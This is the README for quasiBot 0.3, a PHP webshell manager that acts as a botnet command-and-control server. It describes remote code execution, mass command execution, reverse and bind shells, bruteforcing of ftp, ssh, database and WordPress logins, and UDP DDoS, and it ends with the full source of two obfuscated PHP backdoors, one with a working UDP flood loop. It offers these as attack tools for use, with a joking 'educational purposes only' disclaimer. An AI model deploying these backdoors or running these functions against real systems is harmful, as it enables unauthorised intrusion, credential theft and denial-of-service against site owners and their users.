quasiBot 0.3 - Read Me

Author: Smash_ (smash[at]devilteam.pl)
GitHub project: https://github.com/Smaash/quasibot
Date: 07.08.14

1. Agenda

QuasiBot is a complex webshell manager written in PHP, which operate on web-based backdoors implemented by user himself. Using prepared php backdoors, quasiBot will work as C&C trying to communicate with each backdoor. Tool goes beyond average web-shell managers, since it delivers useful functions for scanning, bruteforcing, exploiting and so on. It is quasi-HTTP botnet, therefore it is called. Also, quasiBot allows you to perform various bruteforce attacks on services such as ftp, ssh or databases.

All data about bots is stored in SQL database, ATM only MySQL is supported. TOR proxy is also supported, the goal was to create secure connection between C&C and backdoors; using SOCKS5, it is able to torify all connections between you and web server. All configuration is stored in config file. QuasiBot it's still under construction so i am aware of any potential bugs.

You will need any web server software; tested on Linux, Apache 2.2 and PHP 5.4.4. Fully written in PHP.


2. How it works?

 - quasiBot is operating on web-shells delivered by user, each backdoor is being verified by md5 hash which changes every hour

		quasiBot (C&C) -[request/verification]-> Bots (Webshells) -[response/verification]-> quasiBot (C&C) -[request/command]-> Bots (Webshells) -[response/execution]-> quasiBot (C&C)				
 - Backdoors consists of two types, with and without DDoS module, source code is included and displayed in home page; 
 - Connection between C&C and server is being supported by curl, TOR proxy is supported, User Agent is being randomized from an array

 		quasiBot (C&C) -[PROXY/TOR]-> Bots (Webshells) <-[PROXY/TOR]- quasiBot (C&C)

 - Webshells can be removed and added at 'Settings' tab, they are stored in database
 - 'RSS' tab contain latest exploits and vulnerabilities feeds
 - 'RCE' tab allows to perform Remote Code Execution on specific server using selected PHP function
 - 'Scan' tab allows to resolve IP or URL and perform basic scan using nmap, dig and whois - useful in the phase of gathering information
 - 'Pwn' tab stands for few functions, which generally will help collect informations about server and try to find exploits for currently used OS version using Exploit Suggestor module
 - 'MySQL Manager', as the name says, can be used to perform basic operations on specific database - it could be helpful while looking for config files that include mysql connections on remote server; it also displays some informations about it's envoirment
 - 'Run' tab allows you to run specific command on every bots at once
 - 'DDoS' tab allows you to perform UDP DoS attacks using all bots or single one, expanded backdoor is required
 - 'Shell' tab allows you to spawn reverse or bind shell; you may pick between few languages that will be used for creating reverse shell
 - You may enable authorisation module, user is being validated by session, auth credentials are stored in config file, not in db; using Cookie Auth, user won't be able to use quasiBot until specific cookie will be used
 - 'Bruteforce' category consists of few modules, they allow you to perform single or massive attacks on ftp, ssh, mysql, pgsql, mssql and wordpress
 - Broken credentials are stored in database, bruteforce on websites can be done via tor
 - Whole front-end is maintaned in a pleasant, functional interface


3. Running quasi for first time

 - Move all files to prepared directory, change default settings and login credentials in config file (config.php)
 - Visiting quasiBot for the first time will create needed database and it's structure
 - In 'Settings' tab, you are able to add and delete shells, you're ready to go
 - Using authorisation? To logout, simply add GET logout to current URL, like quasi/index.php?logout


4. Changelog

-0.3
 - Bruteforce: SSH, FTP, WWW, DB's
 - Details

- 0.2
 - Added authorization (Sessions / Cookie Auth)
 - Added Shell Module (Reverse / Bind shell)
 - Added Linux Exploit Suggestor module


5. WebShells

 a) Basic backdoor

<?php
if($_GET['_']) {
print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { @$_GET['___'](); }
?>

 b) Backdoor with DDoS module

<?php
if($_GET['_']) {
print "<!--".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|".md5(666)."-->";
} elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
?>

...and ofc., it's for educational purposes only ;)
